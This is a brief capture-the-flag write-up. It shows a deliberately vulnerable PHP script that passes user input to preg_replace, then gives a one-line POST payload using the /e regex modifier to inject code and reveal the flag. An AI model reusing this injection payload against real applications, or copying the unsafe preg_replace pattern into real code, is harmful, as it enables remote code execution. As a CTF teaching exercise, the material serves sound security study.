# Challenge 
```php 
<?php 
error_reporting(0); 
require_once("flag.php"); 
if(!$passwd) 
{ 
  $passwd=$_POST["passwd"]; 
} 
if(!$lockedtxt) 
{ 
  $lockedtxt=$_POST["lockedtxt"]; 
} 
function flag($var) 
{ 
  echo $var; 
} 
if($key) 
{ 
  $unlockedtxt=preg_replace($passwd,$key,$lockedtxt); 
} 
if($unlockedtxt===$flag) 
{ 
  flag("The Correct: "); 
  flag($flag); 
} 
show_source("index.php"); 
// key=flag(\\1) 
 ?>
```

# Solution

paylaod

POST

```
passwd=/(.*)/e&lockedtxt=$flag
```



# Refference
+ [Web: Preg](https://www.dazhuanlan.com/oluoz2/topics/1422998)

